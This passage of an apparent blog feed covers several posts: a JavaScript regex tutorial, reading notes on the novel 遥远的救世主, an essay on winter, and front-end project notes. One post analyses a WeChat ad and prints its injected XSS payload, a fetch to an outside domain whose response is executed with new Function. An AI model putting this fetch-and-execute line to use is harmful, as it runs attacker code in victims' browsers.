operator">=</span> <span class="token string">"2017-06-12"</span><span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["2017-06-12", "2017", "06", "12", index: 0, input: "2017-06-12"]</span></code></pre><h3 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h3><p>可以在正则本身里引用分组，但只能引用之前出现的分组，即反向引用。<br>反向引用实际开发中因为对正则掌握不全面，很少使用，需要重视。</p><p>匹配 <code>2022-11-25</code> 字符，可以使用</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> reg <span class="token operator">=</span> \d<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token number">4</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token punctuation">)</span>\d<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token punctuation">)</span>\d<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>\</code></pre><p>![[Pasted image 20221125075148.png]]</p><p><strong>也可以使用反向引用。注意下面的正则中的 <code>\1</code>，是分组引用，后面第二个 <code>-</code> 就可以使用分组引用的 <code>\</code> 去实现。</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> reg <span class="token operator">=</span> \d<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token number">4</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token punctuation">)</span>\d<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>\<span class="token number">1</span>\d<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>\</code></pre><p>![[Pasted image 20221125074823.png]]</p><h2 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h2><p>回溯和算法中的回溯非常像，都是先占有，然后等后面的匹配出现问题了，再回退，重新匹配。<br>正则 <code>/ab&#123;1,3&#125;c/</code>，匹配文本 <code>abbbc</code>，形式如下：<br>![[Pasted image 20221125080009.png]]<br>先匹配 3 个 b，然后匹配 c，这里一次性通过了，没有产生回溯。<br>如果匹配字符串 <code>abbc</code>, 那么将产生回溯<br>![[Pasted image 20221125080132.png]]<br>他会持续性的匹配 b 字符，知道出错，然后产生回退（回溯）。</p><h3 id="回溯形式"><a href="#回溯形式" class="headerlink" title="回溯形式"></a>回溯形式</h3><h4 id="贪婪量词"><a href="#贪婪量词" class="headerlink" title="贪婪量词"></a>贪婪量词</h4><p>在局部是贪婪地，但是也要满足整体的正确匹配。</p><h4 id="惰性量词"><a href="#惰性量词" class="headerlink" title="惰性量词"></a>惰性量词</h4><p>惰性量词就是在贪婪量词后面加个问号，表示尽可能少的匹配。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"12345"</span><span class="token punctuation">;</span> <span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/(\d&amp;#123;1,3&amp;#125;?)(\d&amp;#123;1,3&amp;#125;)/</span><span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["1234", "1", "234", index: 0, input: "12345"]</span></code></pre><p>![[Pasted image 20221125081204.png]]</p><p>惰性量词，匹配到第一次就结束，但是为了整体匹配达成，需要进行多次匹配。因此最后 <code>&#123;1,3&#125;?</code> 的匹配是 <code>12</code></p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"12345"</span><span class="token punctuation">;</span> <span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/(\d&amp;#123;1,3&amp;#125;?)(\d&amp;#123;1,3&amp;#125;$)/</span><span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ['12345', '12', '345', index: 0, input: '12345', groups: undefined]</span></code></pre><p>![[Pasted image 20221125081303.png]]</p><h4 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h4><p>分支结构也是惰性的，比如 <code>/can|candy/</code>，匹配字符串 <code>candy</code>，得到的结果是 <code>can</code>，前面的分支满足了，就不会尝试后面的匹配。</p><h3 id="语言本身"><a href="#语言本身" class="headerlink" title="语言本身"></a>语言本身</h3><h4 id="语言结构"><a href="#语言结构" class="headerlink" title="语言结构"></a>语言结构</h4><table><thead><tr><th>结构</th><th>说明</th></tr></thead><tbody><tr><td>字面量</td><td>匹配一个具体字符,包括不用转义的和需要转义的。比如 a 匹配字符 “a”, 又比如 \n 匹配换行符,又比如 . 匹配小数点</td></tr><tr><td>字符组</td><td>匹配一个字符, 可以是多种可能之一, 比如 [0-9], 表示匹配一个数字。也有 \d 的简写形式。另外还有反义字符组,表示可以是除了特定字符之外任何一个字符,比如 [^0-9], 表示一个非数字字符,也有 \D 的简写形式</td></tr><tr><td>量词</td><td>表示一个字符连续出现, 比如 a{1, 3} 表示 “a” 字符连续出现 3 次。另外还有常见的简写形式, 比如 a+ 表示 “a” 字符连续出现至少一次</td></tr><tr><td>锚</td><td>匹配一个位置,而不是字符。比如 ^ 匹配字符串的开头,又比如 \b 匹配单词边界, 又比如 (?=\d) 表示数字前面的位置</td></tr><tr><td>分组</td><td>用括号表示一个整体,比如 (ab)+,表示 “ab” 两个字符连续出现多次, 也可以使用非捕获分组 (?:ab)+。</td></tr><tr><td>分支</td><td>多个子表达式多选一, 比如 abc|bcd, 表达式匹配 “abc” 或者 “bcd” 字符子串。反向引用, 比如 \2, 表示引用第 2 个分组</td></tr></tbody></table><h4 id="操作符优先级"><a href="#操作符优先级" class="headerlink" title="操作符优先级"></a>操作符优先级</h4><table><thead><tr><th>操作符描述</th><th>操作符</th><th>优先级</th></tr></thead><tbody><tr><td>转义符</td><td>\</td><td>1</td></tr><tr><td>括号和方括号</td><td>()、(?:…)、(?=…)、(?!…)、[…]</td><td>2</td></tr><tr><td>量词限定符</td><td><code>&#123;m&#125;、&#123;m, n&#125;、&#123;m,&#125;、?、*、+ </code></td><td>3</td></tr><tr><td>位置和序列</td><td>^、$、元字符、一般字符</td><td>4</td></tr><tr><td>管道符</td><td>|</td><td>5</td></tr></tbody></table><p>晚上想发布的时候，好像还是很难记，送上打油诗一首：</p><p>尖尖是开头，美国有末日<br>加加叠叠叠，星星可多少<br>问号最神秘，最多给一次<br>括号分类型，分组还给你<br>中括号最花心，一个即是对<br>花括号最贪心，总想多又多<br>花括号加问号，才懂够用就好</p><p>配上字符之后即是：</p><p>尖尖 (^^) 是开头，美国 ( $$) 有末日<br>加加（++）叠叠叠，星星 (**) 可多可少<br>问号 (??) 最神秘，最多给一次<br>括号 () 分类型，物以群分<br>中括号 [] 最花心，一个即是对<br>花括号 {m,n} 最贪心，总想多又多<br>花括号配问号{m,n}?，才懂够用够用就好</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ol><li>正则指引</li><li>JavaScript 正则表达式迷你书</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;正则表达式是匹配模式，要么匹配字符，要么匹配位置。能够实现模糊匹配。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;横向模糊匹配：正则可匹配的字符串的长度是不固定的&lt;/li&gt;
&lt;li&gt;纵向模糊匹配：正则匹配的字符串，具体到某一位数字时，他可以不是某个确定的字符，可以用多种可能。&lt;/li&gt;
&lt;/
      
    
    </summary>
    
    
      <category term="front-end" scheme="https://jscoder.com/categories/front-end/"/>
    
    
  </entry>
  
  <entry>
    <title>遥远的救世主</title>
    <link href="https://jscoder.com/2022/11/08/reading/distant-saviour/"/>
    <id>https://jscoder.com/2022/11/08/reading/distant-saviour/</id>
    <published>2022-11-08T14:02:17.000Z</published>
    <updated>2023-10-18T13:26:55.839Z</updated>
    
    <content type="html"><![CDATA[<h2 id="王庙村的农民"><a href="#王庙村的农民" class="headerlink" title="王庙村的农民"></a>王庙村的农民</h2><p>王庙村的农民可能是这本书中最没有存在感的一群人，艰苦，朴素，吃别人吃不了的苦，受别人受不了的罪，干别人干不了的活。面朝黄土背朝天的生活，因为丁元英的扶贫，开了一扇窗户，所有人都在努力的去抓住这根救命稻草。</p><p>苦吗，苦。吃不得苦中苦，哪能改变生活？人与人之间没有特质的差异，拼的就是谁对自己更狠。</p><h2 id="刘冰"><a href="#刘冰" class="headerlink" title="刘冰"></a>刘冰</h2><p>市侩，自作聪明。小生意上面，这种人也许是极好的，能赚点小钱。但是没有大的格局，有点风吹草动就要退股，眼光短浅，难成大器。最终也死在了自己的自作聪明中。不是命运不给他活路，实在是他自己不给自己活路。</p><p>某些时候，我觉得我也是这样的人，鼠目寸光，看不到长远的未来，为了蝇头小利，沾沾自喜。</p><h2 id="欧阳雪"><a href="#欧阳雪" class="headerlink" title="欧阳雪"></a>欧阳雪</h2><p>从混沌摊起步，一步一个脚印经营者着大饭店，不熟悉的领域绝对不碰，参与这场游戏，只是因为一个赌局，只是为了维护芮小丹。让人很舒服的一个人，后来有了公司股权，也都是委托给专业人士打理，自己只做自己熟悉的事情。</p><p>有过几次冲突的场景，都没有任何的妥协，不惧怕困难。看这些段落的时候，我总是想起《大染坊》中的陈六子，都是从一无所有开始，到拥有丰富的物质生活。陈六子要饭出生，几个重要关头也是天不怕地不怕，” 大不了从头再来 “。</p><p>大不了从头再来。主动或者被动的失去现在的一切，一切从 0 开始，需要多大的勇气和豪情。什么都不敢失去，最终会失去所有，放弃一些俗念，专注问题本身，不被外界牵扯撕拉，保持内心的平静，怕什么，大不了从头再来。</p><h2 id="书摘"><a href="#书摘" class="headerlink" title="书摘"></a>书摘</h2><p> 第一章</p><blockquote><p>朋友？不可能。认识、熟人、够得上说话，这就已经不错了。咱跟人家根本不是一种人，凭什么跟人家成朋友？”</p></blockquote><blockquote><p>肖亚文说：“认识这个人就是开了一扇窗户，就能看到不一样的东西，听到不一样的声音，能让你思考、觉悟，这已经够了。其它还有很多，比如机会、帮助，我不确定。这个在一般人看来可能不重要，但我知道这个人很重要。”</p></blockquote><blockquote><p>肖亚文说：“当你觉得这个人很特别的时候，千万别对这种人动心思，一旦动了那种心思你就算把地狱之门打开了，除了自己受折磨不会有第二种结果。这种不是人的人是个女人都受不了，他妻子只跟他过了半年就离婚了，说他不是人。我说这话你可以不当回事，但是如果真的发生了，那是你自找的，别怪我没提醒过你。<br>注: 这是故意的吧</p></blockquote><blockquote><p>其实我也动过这个念头，神不知鬼不觉地跟着买点就行，可心理承受不了，超出道德底线了。<br>注: 酒桌赌局</p></blockquote><p> 第三章</p><blockquote><p>丁元英说：“如果没有特别的事，我打算明天走。有什么事你先说。”<br>注: 如果没有特别的事，多给对方面子，我可以推迟的。</p></blockquote><blockquote><p>丁元英醉醺醺地说：“中国的传统文化是皇恩浩大的文化，它的实用是以皇天在上为先决条件。中国为什么穷？穷就穷在幼稚的思维，穷在期望救主、期望救恩的文化上，这是一个渗透到民族骨子里的价值判断体系，太可怕了。”</p></blockquote><p> 第十章</p><blockquote><p>芮小丹说：“驾御？我没想过，我就是一个心眼儿想疼他。”</p></blockquote><blockquote><p>芮小丹一笑说：“即便是呼之欲出你也讲不出，因为一说就错，这就像法律不能单纯以推理定罪，得允许在可能与事实之间存续一个演化的过程。”<br>注: 这男人追的，无话可说</p></blockquote><p> 第十一章</p><blockquote><p>他永远都不会跟你吵架，他的每一个毛孔里都渗透着对世俗文化的居高临下的包容，包容到不屑于跟你讲道理，包容到让你自己觉得低俗、自卑，当你快要憋死、快要疯掉的时候，你能想到的就只有一个字，逃！”</p></blockquote><blockquote><p>肖亚文说：“所以，他不会让自己绊倒两次。而你，求之不得，就得受相思之苦。相思有多苦，古今的诗词都说尽了。你是女人，有女人的天性，一旦陷进去就很难自拔。丁元英这种人对女人没有意义，是女人就有贪嗔痴，没有贪嗔痴的女人是天国的女人。”</p></blockquote><p> 第十二章</p><blockquote><p>丁元英心里明白这是揭幕的前奏，于是坦率地说：“女人是形式逻辑的典范，是辩证逻辑的障碍，我无意摧残女人，也不想被女人摧残。”<br>注: 哈哈</p></blockquote><blockquote><p>他站起身，弯腰捡起那件睡衣，轻轻地给芮小丹裹在身上，又坐回到原处，望着她极其诚恳地说道：“你是一块玉，但我不是匠人，我不过是一个略懂投机之道的混子，充其量挣几个打发凡夫俗子的铜板。你要求的，是一种雄性文化的魂，我不能因为你没说出来而装不知道。接受你，就接受了一种高度，我没有这个自信。”<br>注: 这还不上？</p></blockquote><p> 第十三章</p><blockquote><p>二号人物王明阳 38 岁，美术学院本科学历，未婚，黑恶集团军师，此人精通法律和社会学，沉着、残忍，心理素质稳定，智商过人，<br>注: 本科！高智商啊</p></blockquote><p> 第十四章</p><blockquote><p>芮小丹陶醉地说：“那还不如让那一枪响了，我就在你心里永恒了。”<br>注: 会的……</p></blockquote><blockquote><p>丁元英说：“透视社会依次有三个层面：技术、制度和文化。小到一个人，大到一个国家一个民族，任何一种命运归根到底都是那种文化属性的产物。强势文化造就强者，弱势文化造就弱者，这是规律，也可以理解为天道，不以人的意志为转移。”</p></blockquote><blockquote><p>丁元英说：“强势文化就是遵循事物规律的文化，弱势文化就是依赖强者的道德期望破格获取的文化，也是期望救主的文化。强势文化在武学上被称为“秘笈”，而弱势文化由于易学、易懂、易用，成了流行品种。”</p></blockquote><blockquote><p>丁元英想了一会儿，举例说：“比如说文化产业，文学、影视是扒拉灵魂的艺术，如果文学、影视的创作能破解更高思维空间的文化密码，那么它的功效就是启迪人的觉悟、震撼人的灵魂，这就是众生所需，就是功德、市场、名利，精神拯救的暴利与毒品麻醉的暴利完全等值，而且不必像贩毒那样耍花招，没有心理成本和法律风险。”<br>注: 文化的高级</p></blockquote><blockquote><p>丁元英沉思了一会儿，说：“这个人需要一个句号，你可以帮他画一个。”<br>注: 他需要的是从上而下的，智慧上面的压制。</p></blockquote><blockquote><p>“灵魂归宿感。”丁元英解释说：“这是人性本能的需要，是人性，你帮他找块干净的地方归宿灵魂，他需要的不是忏悔，而是一个可以忏悔的理由。”</p></blockquote><p> 第十五章</p><blockquote><p>芮小丹说：“不因上天堂与下地狱的因果关系而具有的极高人生境界，就是窄门。耶稣为拯救世人甘愿自己被钉在十字架上，是肉身的地狱，是灵魂的天堂。基督徒的得救缘于神的‘约’，缘于神的应许。但进不得窄门也同样缘于‘约’，缘于神的应许。窄门是基督道德理想的最高价值。”</p></blockquote><blockquote><p>芮小丹说：“进了窄门，神立刻就会告诉你：我是不存在的，神就是你自己。但是，证到如此也并不究竟，神是什么？神即道，道法自然，如来。”</p></blockquote><blockquote><p>芮小丹盯着他的眼睛，用极其平静的口吻说：“文明对于不能以人字来界定的人无能为力，我除了鄙视和震惊，不会再有第三种反应。人的法则是，一颗阴暗的心永远托不起一张灿烂的脸，这不是卫道士的说教，这是人性。”<br>王明阳茫然地问：“天国在哪儿？”<br>芮小丹庄重地说：“天国在你心里。”</p></blockquote><blockquote><p>你不知道你，所以你是你，如果你知道了你，你就不是你了。</p></blockquote><blockquote><p>丁元英抽着烟思索了一会儿，说：“这世上原本就没什么神话，所谓的神话不过是常人的思维所不易理解的平常事。”</p></blockquote><p> 第十八章</p><blockquote><p>欧阳雪说：“不一样，一个是天涯咫尺，一个是咫尺天涯，能一样吗？”</p></blockquote><blockquote><p>丁元英脸上呈现出一种少有的严肃神态，语调低沉而凝重地说：“我有几句不能跟你讲理也无法给你解释所以然的话，希望你能听进去。关键一句：你应该辞职。请注意，是你应该，而不是我希望。只要你一分钟是警察，你这一分钟就必须要履行警察的天职，你就没有避险的权力。但是，国家机器不缺一个迟早要被淘汰的女刑警，而社会应该多一个有非常作为的人才，这不是通俗的英雄主义和通俗的平等意识可以理解的价值。”</p></blockquote><blockquote><p>丁元英望着窗外说：“这就是圆融世故，不显山不露水，各得其所。可品性这东西，今天缺个角、明天裂道缝，也就离塌陷不远了。”</p></blockquote><p> 第十九章</p><blockquote><p>丁元英说：“这不是一个道德境界问题，是市场生存的法则问题。这种好感不仅仅是我们强行摊派价值观，也不仅仅是腐蚀我们自身的竞争力，更说明我们不是靠产品征服市场而是靠作秀混迹市场，这种违背商业属性的人文评价最终将葬送这个公司。”<br>注: 真是通透</p></blockquote><blockquote><p>生存法则很简单，就是忍人所不忍，能人所不能。忍是一条线，能是一条线，两者的间距就是生存机会。</p></blockquote><blockquote><p>具体到咱们当下这事，就是认准市场，吃别人吃不了的苦，受别人受不了的罪，做别人做不到的成本和质量。这个，就是你们的救世主。扶贫的本质在一个扶字，如果你根本就没打算自己站起来，老天爷来了都没用。</p></blockquote><blockquote><p>本来这钱说是借的，我是怕做赔了还不了钱才把她硬拉进股东，当时小丹正在读大学，根本没有经商的心思，我跟她说得天花乱坠，其实心里一点都没底。小丹心里什么都知道，可就是不捅破这层纸，一直给我留着面子。这事过去好多年了，我一直都忘不了。<br>注: 也许这就是两肋插刀的朋友吧。</p></blockquote><p> 第二十章</p><blockquote><p>丁元英打开一瓶矿泉水喝了一口说：“小丹想要个礼物，就有了这档子事。王庙村是贫困县里的贫困村，小丹要的礼物就是在王庙村给她写个神话。”<br>注: 真是浪漫……</p></blockquote><blockquote><p>丁元英说：“什么神话？不过是强力作用的杀富济贫，扒着井沿看一眼而已，不解决造血问题，谁敢拿着一个村子的农民去证明扒井沿儿看一眼的结果？那就不是错了，是罪。如果真理是人做出来的，那也不叫真理了，叫主义。”</p></blockquote><blockquote><p>核心在一个小聪明上，小聪明的文章做好了，就能诱导乐圣公司的大聪明，而潜伏在小聪明其中的，是大智若愚。</p></blockquote><blockquote><p>如果扒着井沿儿看一眼再掉下去，那就真是饱了眼福，苦了贪心，又往地狱里陷了一截子。</p></blockquote><blockquote><p>丁元英说：“晚辈以为，传统观念的死结就在一个‘靠’字上，在家靠父母，出门靠朋友，靠上帝、靠菩萨、靠皇恩……总之靠什么都行，就是别靠自己。这是一个沉积了几千年的文化属性问题，非几次新文化运动就能开悟。晚辈无意评说道法，只在已经缘起的事情里顺水推舟，借英雄好汉的嗓子喊上两声，至少不违天道朝纲。”</p></blockquote><blockquote><p>智玄大师说：“弱势得救之道，也有也没有。没有竞争的社会就没有活力，而竞争必然会产生贫富、等级，此乃天道，乃社会进步的必然代价。无弱，强焉在？一个‘强’字，弱已经在其中了。故而，佛度心苦，修的是一颗平常心。”</p></blockquote><p> 第二十一章</p><blockquote><p>丁元英说：“想干成点事就记住两句话，别把别人不当人了，别把自己太当人了。就这点规律而言，天下乌鸦一般黑。</p></blockquote><p> 第二十二章</p><blockquote><p>你是谁？我是谁？这些问题我也想过。咱们两个活得不一样，我活得很简单，你活得太复杂，不是平行的两条线，是交叉而过。但是，这于我已经够了。<br>注: 又立 flag 了</p></blockquote><blockquote><p>丁元英说：“是皇天在上的文化，是救主、救恩的文化。如果一个民族的文化从骨子里就是弱势文化属性，怎么可能去承载强势文化的政治、经济？衡量一种文化属性不是看它积淀的时间长短，而是看它与客观规律的距离远近。五千年的文化是光辉、是灿烂，这个没有问题。但是，传统和习俗得过过客观规律的筛子。”</p></blockquote><p> 第二十三章</p><blockquote><p>肖亚文说：“记得有一次丁总请韩总吃饭的时候酒桌上闲聊，我问丁总，为人处事怎么才能做到恰到好处？丁总说，恰到好处是‘正好’，‘正好’是假的，不是究竟本来，是假的就立不住。我不懂，就问他是什么究竟本来？他说‘一切’。我还是不懂，就说你就告诉我应该怎么做吧。丁总说了一句话：随缘惜缘不攀缘。</p></blockquote><p> 第二十五章</p><blockquote><p>如果我的能力只能让我穷困潦倒，那穷困潦倒就是我的价值。</p></blockquote><p> 第二十七章</p><blockquote><p>你看上的这个人，一定是你驾驭不了的人</p></blockquote><p> 第三十五章</p><blockquote><p>肖亚文说：“这不是钱的问题，格律诗是丁总操持的扶贫公司，我能有个拍马屁的机会就不错了，哪儿还敢再要扶贫的钱？问题是，我行吗？”<br>注: 这不是人，这是神。但是贵人出现的时候，你能把握住吗？</p></blockquote><p> 第三十六章</p><blockquote><p>不该作为的不作为就是作为</p></blockquote><blockquote><p>神就是道，道就是规律，规律如来，容不得你思议，按规律办事的人就是神。</p></blockquote><blockquote><p>没钱的时候就选择既清静又生活成本低的地方，有条件了就选择更清静点的地方。</p></blockquote><blockquote><p>芮小丹说：“只要不是我觉到、悟到的，你给不了我，给了我也拿不住，叶晓明他们就是例子。只有我自己觉到、悟到的，我才有可能做到，我能做到的才是我的。”</p></blockquote><p> 第三十九章</p><blockquote><p>马经理哈哈一阵大笑，然后摇摇头感慨地说：“不是咱想黑，是不黑不行啊！用元英的话说，这世界要不是黑白颠倒，那还叫众生吗？那该叫天国了。”</p></blockquote><p> 第四十章</p><blockquote><p>除掉对手是为了自己能活得更好，如果是为了给自己掘墓，那么杀这个人的意义又在哪儿？</p></blockquote><blockquote><p>“我还是那句话，潮起潮落是常有的事，别太放在心上。</p></blockquote><blockquote><p>林雨峰说：“如果是你，你会承诺吗？靠封官许愿捏在一起，你能指望这样的队伍去攻城拔寨？丁元英是明白人，扶不起来的硬扶，到头来会摔得更惨。”</p></blockquote><p> 第四十三章</p><blockquote><p>别把自己太当人了，吃人家吃不了的苦，受人家受不了的罪，做人家做不到的成本和质量。</p></blockquote><p> 第四十四章</p><blockquote><p>只有你行，你才有机会</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;王庙村的农民&quot;&gt;&lt;a href=&quot;#王庙村的农民&quot; class=&quot;headerlink&quot; title=&quot;王庙村的农民&quot;&gt;&lt;/a&gt;王庙村的农民&lt;/h2&gt;&lt;p&gt;王庙村的农民可能是这本书中最没有存在感的一群人，艰苦，朴素，吃别人吃不了的苦，受别人受不了的罪，干别人干不了
      
    
    </summary>
    
    
      <category term="reading" scheme="https://jscoder.com/categories/reading/"/>
    
    
      <category term="book" scheme="https://jscoder.com/tags/book/"/>
    
  </entry>
  
  <entry>
    <title>冬天</title>
    <link href="https://jscoder.com/2022/10/28/anything/winter/"/>
    <id>https://jscoder.com/2022/10/28/anything/winter/</id>
    <published>2022-10-28T00:00:00.000Z</published>
    <updated>2023-10-18T13:26:55.835Z</updated>
    
    <content type="html"><![CDATA[<p>天气渐凉，夏去秋来，秋去冬来。窗外的落叶越来越厚，人们的衣服也越来越厚，寒风刺骨，刺透很多人的心房。市场凉了，招聘凉了，很多人工作都很难找到，这个冬天冷的让人绝望。</p><p>冬天是单调的。灰色浸染着一切，风雨雪，似乎要把人间撕裂，把一切的美好毁灭。<br>冬天是乏味的。没有了春的千娇百媚，夏的热情激烈，秋的晴空万里，冬天只有萧瑟和肃杀，让人提不起一点兴趣。</p><p>冬至，宣告着冬天的到来，太阳直射南回归线，然后开始向北移动。当万物寂寥时候，阳光已经开始逐渐回归。</p><p>冬天是最好的礼物，万物在疯狂生长之后，沉寂，万物更替，或被淘汰滋养万物，或悄然积蓄力量，等待春天的来临。</p><p>一个有能力的人，四季变化不会对他造成影响，他的目标坚定，在通往未来的路上忙碌，无暇顾及四季的变化。冬天挤掉了泡沫，挤掉了名不副实的人，挤掉了心猿意马四处观望的人，冬天是一个沉淀的时节。</p><p>是自怨自艾，还是奋力向前；是畏缩逡巡，还是一鼓作气；是悲观失落，还是积极求变。</p><p>如果我们还不好，那要珍惜冬天，繁华退去，只有冬天才能给你清醒。待春天来临，你也如那绿芽一样，肆意生长，百花艳羡。只要我们足够优秀，就不会没有足够的舞台，让我们肆意疯狂的演出。</p><p>停止抱怨，与其懊悔没有在春天种一棵树，那就现在开始，种一棵树最好的时间就是现在。冬天种下的树，不拒风雨严寒，必然长的更加茁壮。</p><p>愿你我的冬天，热情如火，激情澎湃，肆意生长。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;天气渐凉，夏去秋来，秋去冬来。窗外的落叶越来越厚，人们的衣服也越来越厚，寒风刺骨，刺透很多人的心房。市场凉了，招聘凉了，很多人工作都很难找到，这个冬天冷的让人绝望。&lt;/p&gt;
&lt;p&gt;冬天是单调的。灰色浸染着一切，风雨雪，似乎要把人间撕裂，把一切的美好毁灭。&lt;br&gt;冬天是乏味的
      
    
    </summary>
    
    
      <category term="anything" scheme="https://jscoder.com/categories/anything/"/>
    
    
  </entry>
  
  <entry>
    <title>一个意思的微信群广告</title>
    <link href="https://jscoder.com/2022/10/06/front-end/xss/"/>
    <id>https://jscoder.com/2022/10/06/front-end/xss/</id>
    <published>2022-10-06T10:00:00.000Z</published>
    <updated>2023-10-18T13:26:55.839Z</updated>
    
    <content type="html"><![CDATA[<p>群广告，语不惊人死不休，</p><p><img src="/images/2022/10/06/16650521586506.jpg"></p><p>跳转之后，出现 sougou 的页面，然后重定向到广告页面。</p><p><img src="/images/2022/10/06/16650521657367.jpg"></p><p>构造了一个 xss，script 标签，被执行。</p><pre class=" language-js"><code class="language-js"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'//iprozz.com/ffff'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>r<span class="token operator">=</span><span class="token operator">></span>r<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>C<span class="token operator">=</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span>C<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><code>iprozz.com/ffff</code> 请求发出去之后，被执行，页面跳转到广告页面。<code>new Function(C)()</code> 这种函数执行方式平时用的还是非常少的，安全方面，各种奇奇怪怪的写法，挺有意思。</p><p>如果只是到这里，也没必要写这篇博客。尝试调试的时候，发现，在一般浏览器里面是无法请求这个地址的，似乎只在微信的浏览器的可以请求，应该是识别了微信的ua。这样二级跳转，可以对域名做一层保护，减少被封。当域名被封之后，也可以修改服务端的跳转地址，实现快速更换域名的目的。</p><p>做戏做全套，我们平时的开发中经常抱有侥幸心理，对比一下人家的态度，我们真的能比骗子更专业吗？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;群广告，语不惊人死不休，&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2022/10/06/16650521586506.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;跳转之后，出现 sougou 的页面，然后重定向到广告页面。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2022
      
    
    </summary>
    
    
      <category term="front-end" scheme="https://jscoder.com/categories/front-end/"/>
    
    
      <category term="安全" scheme="https://jscoder.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>大型项目前端手记</title>
    <link href="https://jscoder.com/2022/09/18/anything/da-xing-xiang-mu-qian-duan-shou-ji/"/>
    <id>https://jscoder.com/2022/09/18/anything/da-xing-xiang-mu-qian-duan-shou-ji/</id>
    <published>2022-09-18T07:36:29.000Z</published>
    <updated>2023-10-18T13:26:55.835Z</updated>
    
    <content type="html"><![CDATA[<p>亿级流量的 c 端项目。主体是多个小程序，并且分化为多个版本。除了扯皮拉扯之外，总想聊一聊，不吐不快。</p><h2 id="保持技术栈的单调性"><a href="#保持技术栈的单调性" class="headerlink" title="保持技术栈的单调性"></a>保持技术栈的单调性</h2><p>因为各种原因，我们的技术栈百花齐放，uniapp，herbjs，内部小程序框架，vue(h5)，react(h5)，苦不堪言。对于新人进来，只能快速熟悉一块内容，熟悉其他的小程序需要重新学习框架，成本比较高，如果框架本身还出现一些bug，简直酸爽。</p><h3 id="少有人走的路"><a href="#少有人走的路" class="headerlink" title="少有人走的路"></a>少有人走的路</h3><p>《少有人走的路》是本挺好的描述亲密关系的书，然而，技术上要小心。少有人选择的技术，那么就是坑多，因为部分业务是继承项目，所以框架沿用的原来的框架，没有文档，没有支持，吭哧吭哧，埋头苦干。没有人问，没有人解释，各种写法奇绝诡异。<br>再给我一次机会，我会毫不犹豫的选择使用熟悉的框架去重构，后续的维护成本会很低，对于长期项目，收益很高。</p><h4 id="选择大路货"><a href="#选择大路货" class="headerlink" title="选择大路货"></a>选择大路货</h4><p>技术选型，选择大路货。虽然 v2ex 把 uniapp 喷的不要不要，然而开发效率，工程化，市场占有率，uniapp 是非常好的，能够让一般开发快速完成工作。<br>然而，uniapp 的 bug 也是有的，我们在开发过程中有遇到，我们选择给 uniapp 提交 mr，一般很快就会被合入。有人维护，有人讨论的技术，不用担心，一定可以找到比较快速的解决办法，没有就完善它，让它变得更美好。</p><h4 id="内部框架是个p"><a href="#内部框架是个p" class="headerlink" 